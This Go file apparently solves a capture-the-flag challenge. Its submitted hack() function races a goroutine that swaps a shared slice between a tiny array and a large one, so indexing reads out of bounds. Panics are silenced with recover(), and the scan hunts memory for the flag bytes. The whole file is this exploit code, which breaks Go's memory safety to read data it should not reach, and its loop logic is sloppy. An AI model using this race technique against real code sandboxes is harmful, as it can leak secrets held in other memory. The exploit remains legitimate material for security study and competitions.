package main


func main() {
	flag := []int64{0, 0, 0, 0, 66, 121, 116, 117, 117, 117, 0, 0, 0, 0, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
	for i, v := range flag {
		flag[i] = v + 1
	}
	println(flag)
	hack()
}

/* your function will be placed here */
/* input the whole hack() function as follow */
/* and end the code with '#' */
func hack(){
    suc :=0
    long := make([]int64, 20000)
    short:= make([]int64, 1)
    println(short)
    println(long)
    confused := short
	go func() {
		for {
			confused = long
			func() {
				if suc >= 0 {
					return
				}
				println(confused)
			}()
			confused = short
		}
	}()
	for {
		func() {
			defer func() { recover() }()
            i := 1
            for{
          	
          	
                if confused[i]==67 && confused[i+1]==122 && confused[i+2]==117 && suc==0{
                    println(confused,i)
                    j := 0
                    for{
                        if j ==45{
                            suc=1
                            println("Success")
                        }
                   
                        //println(confused[i+j])
                        j=j+1
                    }
                }
                i=i+1
                //print("i:")
                //println(i)
            }
        }()
	}
}
